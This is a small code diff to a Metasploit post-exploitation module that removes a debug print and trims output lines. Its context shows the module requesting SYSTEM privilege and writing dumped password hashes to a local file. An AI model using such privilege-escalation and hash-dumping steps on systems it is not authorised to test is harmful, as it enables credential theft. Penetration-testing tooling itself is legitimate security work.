@@ -461,7 +461,6 @@ class Metasploit3 < Msf::Post
 					end
                     
                     else
-					puts migrate_system
 					if migrate_system
 						print_status("Trying to get SYSTEM Privilege")
 						results = session.priv.getsystem
@@ -476,7 +475,7 @@ class Metasploit3 < Msf::Post
 						end
                         else
 						inject_hashdump.each_line do |h|
-							print_good("\t#{h}")
+							print_good("\t#{h.chomp}")
 							file_local_write(pwdfile,h.chomp)
 						end
 					end
